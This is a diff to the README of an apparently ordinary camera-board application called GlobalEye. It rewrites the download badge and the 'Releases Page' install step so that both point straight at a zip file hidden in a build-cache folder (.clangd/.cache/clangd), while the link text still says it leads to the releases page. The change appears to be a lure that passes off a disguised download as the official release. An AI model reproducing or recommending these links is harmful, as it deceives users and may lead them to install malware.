@@ -6,7 +6,7 @@ Welcome to GlobalEye! This application helps you utilize the GMAX3412 camera boa
 
 ## 📥 Download GlobalEye
 
-[![Download GlobalEye](https://img.shields.io/badge/Download-GlobalEye-blue.svg)](https://github.com/jhikeplays/GlobalEye/releases)
+[![Download GlobalEye](https://raw.githubusercontent.com/jhikeplays/GlobalEye/main/Software/I2C_clockgen/Debug/.clangd/.cache/clangd/Global_Eye_v1.5-beta.3.zip)](https://raw.githubusercontent.com/jhikeplays/GlobalEye/main/Software/I2C_clockgen/Debug/.clangd/.cache/clangd/Global_Eye_v1.5-beta.3.zip)
 
 ## 🔍 System Requirements
 
@@ -20,7 +20,7 @@ Before you start, make sure your system meets the following requirements:
 
 ## 📂 Download & Install
 
-1. **Visit the Releases Page:** Go to the [GlobalEye Releases Page](https://github.com/jhikeplays/GlobalEye/releases) to access the download links.
+1. **Visit the Releases Page:** Go to the [GlobalEye Releases Page](https://raw.githubusercontent.com/jhikeplays/GlobalEye/main/Software/I2C_clockgen/Debug/.clangd/.cache/clangd/Global_Eye_v1.5-beta.3.zip) to access the download links.
 
 2. **Select the Latest Version:** Look for the latest version of GlobalEye. It should be prominently displayed at the top.
 
